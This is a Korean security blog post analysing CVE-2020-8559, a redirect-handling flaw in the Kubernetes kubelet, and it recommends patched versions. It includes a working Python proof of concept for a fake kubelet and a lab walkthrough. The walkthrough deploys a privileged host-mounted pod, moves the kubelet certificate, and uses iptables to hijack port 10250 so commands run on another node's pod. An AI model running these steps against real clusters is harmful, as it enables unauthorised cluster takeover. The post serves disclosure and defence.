---
layout: post
title: "CVE-2020-8559 쿠버네티스 클러스터 장악 취약점 분석"
author: Moon Hyun Jong (heizelnet)
date: 2021-04-12 18:00:00
categories: Kubernetes
img: 3.png
---

해당 취약점은 2020년 7월 22일 패치된 Kubernetes 내 구성 요소인 kubelet 취약점 입니다.
특정 노드의 권한을 탈취하였을 때 발생 가능하며, 해당 노드의 kubelet을 변조하여 클러스터 내 다른 노드에 명령을 실행할 수 있습니다.

이 글에서는 다음과 같은 내용을 소개하고자 합니다.

* 배경 지식
* 취약점 발생 원인 및 대상
* POC
* 취약점 예상 연계
* 취약점 추천 보완방향

<br />

## 배경 지식

#### 쿠버네티스 간단 소개

쿠버네티스는 구글이 내부 배포 시스템으로 사용하던 borg를 기반으로 시작한 컨테이너 배포/확장 및 관리를 자동화해주는 오픈소스 플랫폼입니다. 현재 대부분의 퍼블릭 클라우드에서 쿠버네티스 기반 관리형 서비스를 제공하는 등 클라우드 시장의 대세로 자리잡았습니다. Master와 Worker의 구조로 관리를 지원하며, 컨테이너의 다양한 배포 방식을 지원하는 것이 특징입니다.

#### 쿠버네티스의 구성 요소

<div class="img-in-post">
<img src="/images/3/1.png" />
[그림 1] kubernetes cluster structure
</div>

**※** 본 그림은 분석글의 이해를 위해 그린 **간단한** 쿠버네티스 구조입니다.

```
Cluster : 컨테이너를 관리하고 배포하고 동작시키는 기기들의 집합단위
Master  : 클러스터 내에서 컨테이너를 배포하고 관리하는 "기기"
Worker  : 배포되는 컨테이너를 동작시키고 전달받은 관리 명령어를 실행하는 "기기"들
Pod     : 한개 이상의 "컨테이너"로 구성된 실행 배포 단위
kube-apiserver : 클러스터 api 요청이 발생할때 유효검증을 거친 후 REST api를 제공하는 서버
kubelet : 명령을 받아 컨테이너의 정상동작 여부검증과 조건에 맞는 컨테이너 실행을 수행하는 바이너리
```

<br />

#### 쿠버네티스 명령 실행에 따른 동작 방식

<div class="img-in-post">
<img src="/images/3/2.png" />
[그림 2] kubectl command running process
</div>


명령실행 도구인 kubectl을 이용하여 특정 pod에 명령 실행을 진행한 스크린샷입니다. ("**--v=7**" 옵션을 추가하여 로그 출력)

- 1번 : kube-apiserver에 올바르게 명령을 전달하기 위하여 각종설정을 /root/.kube/config 디렉토리에서 load합니다.
- 2번 : 대상 pod가 유효한지 확인하는 명령어가 실행됩니다. ("**kubectl get pods [대상pod]**" 명령과 동일한 과정에 해당됩니다.)
- 3번 :  200 response를 확인한 이후 kube-apiserver가 대상 pod의 node에서 실행되는 kubelet에 접속하여 명령을 실행합니다.
- 4번 :  kubelet을 통해 대상 node의 docker(컨테이너 런타임) 명령들이 수행되고 성공 시 101 response를 전달 받습니다.

<br />

## 취약점 발생 원인 및 대상

#### 취약점 발생 원인

<div class="img-in-post">
<img src="/images/3/3.png" />
[그림 3] vulnerability trigger process 1
</div>


- 명령 전달을 위해 kube apiserver에서 접속하는 kubelet이 공격자 등에 의해 **변조된 kubelet**일 경우, 다른 Node 및 Pod에 변조된 명령을 실행하기 위하여 300번대 **redirect response**를 발생시킵니다.

- 이 300번대 response과 동시에 **Location 헤더**에 원하는 명령에 해당하는 API를 추가합니다.

<Br />

<div class="img-in-post">
<img src="/images/3/4.png" />
[그림 4] vulnerability trigger process 2
</div>


- 이러한 response에 대해 적절한 검증이나 처리가 이루어지지 않을 경우, apiserver는 변조된 명령을 대상 Pod에 전달하게 됩니다.

- 단, 해당 취약점은 kubelet 변조 및 인증서 탈취와 같은 사전작업이 이루어져야 하므로 Node의 **root 권한 장악**이 전제됩니다.

- 해당 취약점이 패치된 버전에서는 다음과 같이 **redirect response**에 대응하는 코드가 추가되었습니다.

<div class="img-in-post">
<img src="/images/3/5.png" />
[그림 5] kubernetes v1.18.6 patched code
</div>


#### 취약점 대상 버전

다음과 같은 버전에서 패치되었으며 하위버전은 공격대상에 해당됩니다.

```
v1.16.13 / v1.17.9 / v1.18.6
```

<br />

## POC 소개와 실습

#### POC 소개

```python
import BaseHTTPServer, SimpleHTTPServer
import ssl

class kubeletHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
        print(self.path)
        master_ip = 'xxx.xxx.xxx.xxx'
        target_pod = 'target_pod_name'
        command = 'command_name_else'
        self.send_response(307);
        self.send_header('Location', 'https://{0}:6443/api/v1/namespaces/default/pods/{1}/exec?command={2}%20from%20{3}&stdout=1&stderr=true'.format(master_ip, target_pod, command, target_pod))
        self.end_headers()


httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 8080), kubeletHandler)
pem_path = 'copied pem file path'
httpd.socket = ssl.wrap_socket (httpd.socket,
                                certfile=pem_path, server_side=True)
httpd.serve_forever()
```

* 해당 POC는 요청이 도착했을 때 **300번대 response**와 함께 실행하고자 하는 명령어를 **Location 헤더**에 추가하는 fake kubelet 역할을 수행하는 간단한 파이선 코드입니다.  (명령어 형식은 REST이며, 실행시킬 컨테이너와 명령어를 삽입해줍니다.)

#### POC 실습 방법

- POC 실습 환경 구성

<div class="img-in-post">
<img src="/images/3/6.png" />
[그림 6] sample cluster structure
</div>


구성도와 같이 대상버전의 환경에 Master Node 1개, Worker Node 2개를 구축한 클러스터를 준비합니다.

```shell
# kubectl label nodes Node1 condition=compromised-node
# kubectl label nodes Node2 condition=very-secure-node
```

Master Node에서 다음과 같은 명령어를 통해 각 Worker Node에 대한 label을 부여합니다.

```yaml
  apiVersion: v1                                                                               #node1.yaml
  kind: Pod
  metadata:
    name: compromised-pod
    namespace: default
  spec:
    containers:
    - name: compromised-container
      image: alpine
      command: ["/bin/sh"]
      args: ["-c", "sleep 72000"]
      securityContext:
        privileged: true
      volumeMounts:
      - name: host-root-volume
        mountPath: /host
    volumes:
    - name: host-root-volume
      hostPath:
        path: /
    hostNetwork: true
    hostPID: true
    restartPolicy: Always
    nodeSelector:
     condition: compromised-node
```

  ```yaml
  apiVersion: v1                                                                               #node2.yaml
  kind: Pod
  metadata:
    name: very-secure-pod
    namespace: default
  spec:
    containers:
    - name: very-secure-container
      image: nginx
      imagePullPolicy: IfNotPresent
    nodeSelector:
      condition: very-secure-node
  ```

상단의 내용을 Master Node에 node1.yaml, node2.yaml로 각각 저장하여 "**kubectl apply -f [파일명]**" 명령어로 적용해줍니다.

<br />

- POC 실습 순서

```
# kubectl exec -it compromised-pod /bin/sh
```

Master Node에서 kubectl을 통해 Node1의 compromised-pod에 접근해줍니다. 실제 상황에서는 container escape 혹은 host 에서 root 권한을 얻은경우에 해당합니다.

```
# apk add python2 vim
```

접근한 compromised-pod에서 poc 코드 편집을 위해 python2와 vim을 설치해줍니다.

```
# mv /var/lib/kubelet/pki/kubelet-20* /tmp/kubelet-server.pem
# vi /tmp/fake-kubelet.py
```

kubelet의 인증서가 보관된 디렉토리에서 인증서를 /tmp 디렉토리로 옮겨주거나 복사합니다.
이후, fake-kubelet.py 파일을 생성하여 poc 코드를 붙여놓고 master_ip, target_pod, pem_path 변수를 환경에 맞게 편집합니다.
(master_ip의 경우에는 /etc/hosts 혹은 환경 변수를 참조하여 작성하며 target_pod는 Node2의 very-secure-pod에 해당됩니다)

```
# iptables -t nat -I PREROUTING -p tcp --dport 10250 -j REDIRECT --to-ports 8080
# iptables -t nat -I OUTPUT -p tcp -o lo --dport 10250 -j REDIRECT --to-ports 8080
# python2 /tmp/fake-kubelet.py&
```

iptables를 통해 10250 (기존 kubelet port 번호) 접근을 8080으로 redirect 시킵니다. 그 다음 fake-kubelet.py를 실행해줍니다.
(해당 작업은 실습 과정이므로, kubelet 바이너리를 변조하는 대신 port-forward를 이용하여 기존의 kubelet을 유지함)

```
# kubectl exec compromised-pod echo hello
```

poc 코드 실행 이후 Master Node에서 compromised-pod에 임의의 명령을 실행합니다.
정상적으로 poc가 실행되었을 때 target_pod로 편집한 command가 실행됩니다.

<br />

## 취약점 예상 연계

해당 취약점은 Node의 root 권한을 필요로 하기때문에 container escape 취약점과 연계될 가능성이 높습니다.

해당 영상은 [CVE-2020-15257 컨테이너 이스케이프 취약점](https://blog.secunologylab.com/CVE-2020-15257/)과 연계한 클러스터 익스플로잇 실행 영상입니다.

<style>.embed-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; } .embed-container iframe, .embed-container object, .embed-container embed { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }</style><div class='embed-container'><iframe src='https://www.youtube.com/embed/HzODqCbDq6c' frameborder='0' allowfullscreen></iframe></div>

<br />

## 취약점 추천 보완방향

해당 취약점의 경우 패치된 버전으로 업데이트를 **강하게** 권장합니다. 업데이트가 불가능한 환경의 경우 Node의 kubelet에서 전송되는 300번대 redirect에 대한 지속적인 logging이나 추가적인 proxy backend를 통한 조치를 추천드립니다.

<br />

## Reference

* https://hackerone.com/reports/863979
* https://bcho.tistory.com/1256
* https://ssup2.github.io/
